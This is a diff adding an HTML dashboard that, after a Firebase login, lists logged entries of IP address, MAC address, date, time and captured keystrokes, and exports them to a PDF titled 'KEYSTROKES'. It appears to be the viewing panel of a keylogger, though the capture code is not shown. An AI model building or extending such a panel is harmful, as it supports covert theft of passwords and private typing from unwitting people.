@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="image.png" size="64*64" type="image/png">
+    <title>REPORT</title>
+    <!-- Firebase App (the core Firebase SDK) -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
+        import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-auth.js";
+        import { getDatabase, ref, get } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";
+        
+        const firebaseConfig = {
+            // space for firebase credentials
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+        const database = getDatabase(app);
+
+        // Check if the user is authenticated
+        onAuthStateChanged(auth, (user) => {
+            if (user) {
+                // User is authenticated, proceed with data fetching
+                const dataRef = ref(database, 'log');
+                get(dataRef).then((snapshot) => {
+                    if (snapshot.exists()) {
+                        const data = snapshot.val();
+                        populateTable(data);
+                        window.firebaseData = data;
+                    } else {
+                        document.getElementById('data-container').textContent = 'No data available.';
+                        window.firebaseData = {};
+                    }
+                }).catch((error) => {
+                    console.error('Error fetching data:', error);
+                    document.getElementById('data-container').textContent = 'Error fetching data.';
+                    window.firebaseData = {};
+                });
+            } else {
+                // No user is signed in, redirect to index.html
+                window.location.href = 'index.html';
+            }
+        });
+
+        function populateTable(data) {
+            const table = document.getElementById('data-table');
+            const tbody = table.querySelector('tbody');
+            tbody.innerHTML = ''; 
+
+            Object.entries(data).forEach(([key, value], index) => {
+                const row = tbody.insertRow();
+                row.insertCell(0).textContent = index + 1;
+                row.insertCell(1).textContent = value.ip || 'N/A';
+                row.insertCell(2).textContent = value.mac || 'N/A';
+                row.insertCell(3).textContent = value.start_date || 'N/A';
+                row.insertCell(4).textContent = value.start_time || 'N/A';
+                row.insertCell(5).textContent = value.keystrokes || 'N/A';
+            });
+        }
+    </script>
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf-autotable/3.5.24/jspdf.plugin.autotable.min.js"></script>
+    <script>
+        async function downloadPDF() {
+            const { jsPDF } = window.jspdf;
+            const doc = new jsPDF();
+            const table = document.getElementById('data-table');
+
+            // Convert table to rows and columns format for jsPDF autoTable
+            const rows = Array.from(table.querySelectorAll('tr')).map(row => 
+                Array.from(row.querySelectorAll('td')).map(cell => cell.textContent)
+            );
+
+            doc.text('KEYSTROKES', 95, 10);
+            doc.autoTable({
+                startY: 20,
+                head: [['S.No', 'IP', 'MAC', 'Date', 'Time', 'Keystrokes']],
+                body: rows.slice(1), 
+                columnStyles: {
+                    0: { cellWidth: 15 },
+                    1: { cellWidth: 30 },
+                    2: { cellWidth: 40 },
+                    3: { cellWidth: 25 },
+                    4: { cellWidth: 20 },
+                    5: { cellWidth: 60 }
+                },
+                styles: { fontSize: 10 },
+                margin: { top: 20 },
+                didPageContent: (data) => {
+                    doc.text('Page ' + data.pageNumber, 190, 285, { align: 'right' });
+                }
+            });
+
+            doc.save('firebase-data.pdf');
+        }
+    </script>
+    <style>
+        body {
+            font-family: 'Courier New', Courier, monospace;
+            background-color: #000;
+            color: #0f0;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            width: 90%;
+            margin: 20px auto;
+            padding: 20px;
+            border: 1px solid #0f0;
+            background-color: #111;
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
+            position: relative;
+        }
+        .button-container {
+            position: absolute;
+            top: 40px; 
+            right: 10px;
+        }
+        button {
+            background: linear-gradient(145deg, #0f0, #0c0);
+            border: none;
+            color: #000;
+            padding: 10px 20px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 8px;
+            box-shadow: 4px 4px 8px rgba(0, 255, 0, 0.5), -4px -4px 8px rgba(0, 255, 0, 0.5);
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        button:hover {
+            background: linear-gradient(145deg, #0c0, #0f0);
+            box-shadow: 6px 6px 12px rgba(0, 255, 0, 0.5), -6px -6px 12px rgba(0, 255, 0, 0.5);
+        }
+        button:active {
+            background: linear-gradient(145deg, #0f0, #0c0);
+            box-shadow: inset 4px 4px 8px rgba(0, 255, 0, 0.5), inset -4px -4px 8px rgba(0, 255, 0, 0.5);
+        }
+        .table-container {
+            max-height: 600px; 
+            overflow-y: auto;
+            margin-top: 20px;
+            border: 1px solid #0f0;
+            border-radius: 8px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 0;
+        }
+        th, td {
+            border: 1px solid #0f0;
+            padding: 12px;
+            text-align: left;
+            transition: background-color 0.3s;
+        }
+        th {
+            background-color: #222;
+            position: -webkit-sticky; 
+            position: sticky;
+            top: 0;
+            z-index: 1;
+        }
+        th:hover {
+            background-color: #333;
+        }
+        tr:nth-child(even) {
+            background-color: #333;
+        }
+        tr:nth-child(odd) {
+            background-color: #222;
+        }
+        tr:hover {
+            background-color: #444;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>REPORT</h1>
+        <div class="button-container">
+            <button onclick="downloadPDF()">Download</button>
+        </div>
+        <div class="table-container">
+            <table id="data-table">
+                <thead>
+                    <tr>
+                        <th>S.No</th>
+                        <th>IP</th>
+                        <th>MAC</th>
+                        <th>Date</th>
+                        <th>Time</th>
+                        <th>Keystrokes</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    
+                </tbody>
+            </table>
+        </div>
+    </div>
+</body>
+</html>
